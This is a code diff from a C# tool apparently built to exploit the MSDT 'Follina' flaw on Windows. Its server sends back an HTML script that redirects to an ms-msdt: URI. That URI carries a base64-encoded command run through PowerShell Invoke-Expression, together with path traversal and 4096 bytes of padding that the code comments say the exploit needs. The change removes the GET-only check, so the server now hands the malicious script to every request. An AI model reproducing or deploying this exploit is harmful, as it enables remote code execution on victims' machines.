@@ -30,28 +30,22 @@ namespace MSDT_Zero_Day
                     BetterConsole.WriteLine("Connection recieved!");
 					var request = context.Request;
 					var response = context.Response;
-					if (request.HttpMethod == HttpMethods.Get)
-					{
-                        BetterConsole.WriteLine("Serving malicious script...");
-						string base64_payload = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));
-						var html_payload = "<script>location.href = \"ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'" + base64_payload + "'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\"\";";
-						html_payload += " //" + RandomString(4096).ToLower(); // minimum requirement of bytes for exploit to work.
-						html_payload += "\n</script>";
+                    BetterConsole.WriteLine(request.HttpMethod);
+                    BetterConsole.WriteLine("Serving malicious script...");
+					string base64_payload = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));
+					string html_payload = "//" + RandomString(4096).ToLower() + "\n"; // minimum requirement of bytes for exploit to work.
+					html_payload += "<script>location.href = \"ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'" + base64_payload + "'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\"\";";
+					html_payload += "\n</script>";
 
-						await response.WriteContentAsync(html_payload);
-					}
-					else
-					{
-						response.MethodNotAllowed();
-					}
+					await response.WriteContentAsync(html_payload);
 					// Close the HttpResponse to send it back to the client.
 					response.Close();
 				};
 				listener.Start();
 
 				BetterConsole.WritePlus($"Now hosting server on: 127.0.0.1:{port}");
-				BetterConsole.WriteLine($"Press any key to stop the server...");
-				Console.ReadKey();
+				BetterConsole.WriteLine($"Press enter to stop the server...");
+				Console.ReadLine();
 			}
 			catch (Exception exc)
 			{
